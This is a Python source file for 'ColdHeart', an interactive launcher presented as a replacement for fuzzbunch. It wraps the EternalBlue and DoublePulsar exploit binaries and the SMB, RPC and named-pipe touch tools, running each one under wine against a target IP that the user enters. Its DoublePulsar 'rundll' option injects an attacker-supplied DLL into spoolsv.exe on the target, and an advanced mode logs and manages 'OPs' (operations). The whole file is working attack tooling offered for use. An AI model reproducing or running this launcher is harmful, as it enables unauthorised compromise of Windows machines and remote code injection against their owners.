### Imports
import os
import sys
import commands
import subprocess
from random import *
from time import sleep
from imports.paths import *
from imports.styles import *
from imports.banners import *
from datetime import datetime
from imports.op_setup import *
###

### Path setup
COLDHEART, CHDIR = setup_paths1(os.path.realpath(__file__))
EXPLOIT_DIR = os.path.join(CHDIR, "exploits")
TOUCH_DIR = os.path.join(CHDIR, "touches")
LOG_DIR = os.path.join(CHDIR, "logs")
OPS_DIR = os.path.join(CHDIR, "OPS")
DP_OUTPUT = os.path.join(CHDIR, "DP_output")
###

### Menus
class menus_:
	def info(self):
		print("ColdHeart is an execution environment designed to be a replacement for fuzzbunch.")
	def mode(self):
		print("Run in [1] autorun mode or [2] advanced mode?") 
	def start(self):
		print('''[1] Exploit menu
[2] Touch menu
[3] Exit''')	
	def exploits(self):
		print('''[1] EternalBlue
[2] DoublePulsar
[3] Exit''')
	def touches(self):
		print('''[1] Named Pipe Touch
[2] RPC Touch
[3] SMB Touch
[4] Exit''')
	def ops(self):
		print('''[1] Load OP
[2] New OP
[3] Delete OP
[4] Exit''')
###

### Main code
def main():
	def red(s):
		print(Style.BRIGHT + Fore.RED + s + Style.RESET_ALL)
	def blue(s):
		print(Style.BRIGHT + Fore.BLUE + s + Style.RESET_ALL)
	def green(s):
		print(Style.BRIGHT + Fore.GREEN + s + Style.RESET_ALL)
	def yellow(s):
		print(Style.BRIGHT + Fore.YELLOW + s + Style.RESET_ALL)
	init()
	banners = [banner1, banner2, banner3]
	colors = [red, blue, green, yellow]
	subprocess.call("resize -s 25 125", shell=True)
	subprocess.call("clear", shell=True)
	choice(colors)(choice(banners))
	menus = menus_()
	menus.info()
	menus.mode()
	answered = False
	while not answered:
		op1 = raw_input(styles.question + "Option > ")
		if op1 == "1":
			log = open(os.path.join(LOG_DIR, "log-%s.txt" % (datetime.now().date())), "a+")
			log.write("| Coldheart Autorun Mode Selected - %s\n" % (datetime.now()))
			answered = True
			menus.start()
			answered2 = False
			while not answered2:
				op2 = raw_input(styles.question + "Option > ")
				if op2 == "1":
					menus.exploits()
					answered2 = True
					answered4 = False
					while not answered4:
						op4 = raw_input(styles.question + "Option > ")
						if op4 == "1":
							answered4 = True
							ip = raw_input(styles.question + "Target IP > ")
							prints.info("Starting EternalBlue now...")
							proc = [(commands.getoutput("wine %s/eternalblue/Eternalblue-2.2.0.exe --inconfig %s/eternalblue/Eternalblue-2.2.0.0.xml --targetip %s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip)))]
							failed = False
							lines = proc[0].splitlines()
							output = []
							for line in lines:
								if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
									pass
								else:
									output.append(line)
							for out in output:
								if "error" in out.lower():
									failed = True
								print(out)
							if failed:
								prints.bad("Eternalblue Complete, but an error was occurred.")
							else:
								prints.good("Eternalblue Complete.")
							answered5 = False
							while not answered5:
								op5 = raw_input(styles.question + "Continue to doublepulsar? y/n : ")
								if op5.lower() == "y":
									answered5 = True
									prints.info("Starting DoublePulsar now...")
									answered6 = False
									while not answered6:
										op6 = raw_input(styles.question + "Functions: rundll, ping, uninstall  Function > ")
										if op6.lower() == "rundll":
											answered6 = True
											prints.warning("Make sure you have a dll ready!")
											dll = raw_input(styles.question + "DLL location ex. /root/Desktop/dll.dll > ")
											proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --function rundll --dllpayload %s --outputfile %s/%s --processname spoolsv.exe" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, dll, DP_OUTPUT, datetime.now())))]
											failed = False
											lines = proc[0].splitlines()
											output = []
											for line in lines:
												if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
													pass
												else:
													output.append(line)
											for out in output:
												if "error" in out.lower():
													failed = True
												print(out)
											if failed:
												prints.bad('Doublepulsar complete, but an error was occurred.')
											else:		
												prints.good('Doublepulsar complete.')
										elif op6.lower() == "ping":
											answered6 = True
											proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --ping --outputfile %s/%s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, DP_OUTPUT, datetime.now())))]
											failed = False
											lines = proc[0].splitlines()
											output = []
											for line in lines:
												if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
													pass
												else:
													output.append(line)
											for out in output:
												if "error" in out.lower():
													failed = True
											if failed:
												prints.bad('Doublepulsar complete, but an error was occurred.')
											else:
												prints.good('Doublepulsar complete.')		
										elif op6.lower() == "uninstall":
											answered6 = True
											proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --uninstall --outputfile %s/%s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, DP_OUTPUT, datetime.now())))]
											failed = False
											lines = proc[0].splitlines()
											output = []
											for line in lines:
												if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
													pass
												else:
													output.append(line)
											for out in output:
												if "error" in out.lower():
													failed = True
												print(out)
											if failed:
												prints.bad('Doublepulsar complete, but an error was occurred.')
											else:	
												prints.good('Doublepulsar complete.')	
										else:
											prints.bad("Invalid Option.")
								elif op5.lower() == "n":
									answered5 = True
									prints.info("Now exiting.")
									sys.exit(0)
								else:
									prints.bad("Invalid Option.")
						elif op4 == "2":
							answered4 = True
							ip = raw_input(styles.question + "Target IP > ")
							prints.info("Starting DoublePulsar now...")
							answered7 = False
							while not answered7:
								op7 = raw_input(styles.question + "Functions: rundll, ping, uninstall  Function > ")
								if op7.lower() == "rundll":
									answered7 = True
									prints.warning("Make sure you have a dll ready!")
									dll = raw_input(styles.question + "DLL location ex. /root/Desktop/dll.dll > ")
									proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --function rundll --dllpayload %s --outputfile %s/%s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, dll, DP_OUTPUT, datetime.now())))]
									failed = False
									lines = proc[0].splitlines()
									output = []
									for line in lines:
										if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
											pass
										else:
											output.append(line)
									for out in output:
										if "error" in out.lower():
											failed = True
										print(out)
									if failed:
										prints.bad('Doublepulsar complete, but an error was occurred.')
									else:	
										prints.good('Doublepulsar complete.')
								elif op7.lower() == "ping":
									answered7 = True
									proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --ping --outputfile %s/%s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, DP_OUTPUT, datetime.now())))]
									failed = False
									lines = proc[0].splitlines()
									output = []
									for line in lines:
										if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
											pass
										else:
											output.append(line)
									for out in output:
										if "error" in out.lower():
											failed = True
										print(out)
									if failed:
										prints.bad('Doublepulsar complete, but an error was occurred.')
									else:	
										prints.good('Doublepulsar complete.')
								elif op7.lower() == "uninstall":
									answered7 = True
									proc = [(commands.getoutput("wine %s/doublepulsar/Doublepulsar-1.3.1.exe --inconfig %s/doublepulsar/Doublepulsar-1.3.1.0.xml --targetip %s --uninstall --outputfile %s/%s" % (EXPLOIT_DIR, EXPLOIT_DIR, ip, DP_OUTPUT, datetime.now())))]
									failed = False
									lines = proc[0].splitlines()
									output = []
									for line in lines:
										if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
											pass
										else:
											output.append(line)
									for out in output:
										if "error" in out.lower():
											failed = True
										print(out)
									if failed:
										prints.bad('Doublepulsar complete, but an error was occurred.')
									else:	
										prints.good('Doublepulsar complete.')
								else:
									prints.bad("Invalid option.")
							prints.good("Doublepulsar Complete.")
						elif op4 == "3":
							prints.info("Now exiting.")
							sys.exit(0)
							
				elif op2 == "2":
					menus.touches()
					answered2 = True
					answered8 = False
					while not answered8:
						op8 = raw_input(styles.question + "Option > ")
						if op8 == "1":
							answered8 = True
							ip = raw_input(styles.question + "Target IP > ")
							prints.info("Starting Named Pipe Touch...")
							proc = [(commands.getoutput("wine %s/namedpipetouch/Namedpipetouch-2.0.0.exe --inconfig %s/namedpipetouch/Namedpipetouch-2.0.0.0.xml --targetip %s" % (TOUCH_DIR, TOUCH_DIR, ip)))]
							failed = False
							lines = proc[0].splitlines()
							output = []
							for line in lines:
								if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
									pass
								else:
									output.append(line)
							for out in output:
								if "error" in out.lower():
									failed = True
								print(out)
							if failed:
								prints.bad('Namedpipetouch complete, but an error was occurred.')
							else:	
								prints.good('Namedpipetouch complete.')
							prints.good("Namedpipetouch complete.")
						elif op8 == "2":
							answered8 = True
							ip = raw_input(styles.question + "Target IP > ")
							prints.info("Starting RPC Touch...")
							proc = [(commands.getoutput("wine %s/rpctouch/Rpctouch-2.1.0.exe --inconfig %s/rpctouch/Rpctouch-2.1.0.0.xml --targetip %s" % (TOUCH_DIR, TOUCH_DIR, ip)))]
							failed = False
							lines = proc[0].splitlines()
							output = []
							for line in lines:
								if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
									pass
								else:
									output.append(line)
							for out in output:
								if "error" in out.lower():
									failed = True
								print(out)
							if failed:
								prints.bad('RPC Touch complete, but an error was occurred.')
							else:	
								prints.good('RPC Touch complete.')
							prints.good("RPC Touch complete.")
						elif op8 == "3":
							answered8 = True
							ip = raw_input(styles.question + "Target IP > ")
							prints.info("Starting SMB Touch...")
							proc = [(commands.getoutput("wine %s/smbtouch/Smbtouch-1.1.1.exe --inconfig %s/smbtouch/Smbtouch-1.1.1.0.xml --targetip %s" % (TOUCH_DIR, TOUCH_DIR, ip)))]
							failed = False
							lines = proc[0].splitlines()
							output = []
							for line in lines:
								if "<" in line or ">" in line or line.startswith('w') or line[0].isdigit():
									pass
								else:
									output.append(line)
							for out in output:
								if "error" in out.lower():
									failed = True
								print(out)
							if failed:
								prints.bad('SMB Touch complete, but an error was occurred.')
							else:	
								prints.good('SMB Touch complete.')
							prints.good("SMB Touch complete.")
						elif op8 == "4":
							answered8 = True
							prints.info("Now exiting.")
							sys.exit(0)
						else:
							prints.bad("Invalid Option.")
				elif op2 == "3":
					prints.info("Now exiting.")
					sys.exit(0)
		elif op1 == "2":
			log = open(os.path.join(LOG_DIR, "log-%s.txt" % (datetime.now().date())), "a+")
			log.write("| Coldheart Advanced Mode Selected - %s\n" % (datetime.now()))
			prints.warning("After Loading, Creating, or Deleting an OP, you should restart coldheart to ensure OP files are loaded correctly.")
			answered = True
			menus.ops()
			answered9 = False
			while not answered9:
				op9 = raw_input(styles.question + "Option > ")
				if op9 == "1":
					answered9 = True
					load_op(OPS_DIR)
					if len(OPS) == 0:
						answered10 = True
						answered9 = False
					else:
						answered10 = False
					while not answered10:
						op10 = raw_input(styles.question + "OP to load > ")
						if op10.lower() in OPS:
							answered10 = True
							current_op = op10.lower()
							file_, op_dir = open("%s/%s/%s.txt" % (OPS_DIR, current_op, current_op), "a+"), "%s/%s" % (OPS_DIR, current_op)
							prints.good("OP '%s' loaded." % (current_op))
							prints.good("OP Log: %s/%s/%s.txt" % (OPS_DIR, current_op, current_op))
							prints.good("OP Dir: %s/%s" % (OPS_DIR, current_op))
							answered9 = False
						else:
							prints.bad("OP '%s' not found." % (op10.lower()))
				elif op9 == "2":
					answered9 = True
					new_op(OPS_DIR)
					answered9 = False
				elif op9 == "3":
					answered9 = True
					del_op(OPS_DIR)	
				else:
					prints.bad("Invalid Option.")
			
					
		else:
			prints.bad("Invalid option.")
main()                                                     


 


                                                 
                                                 




















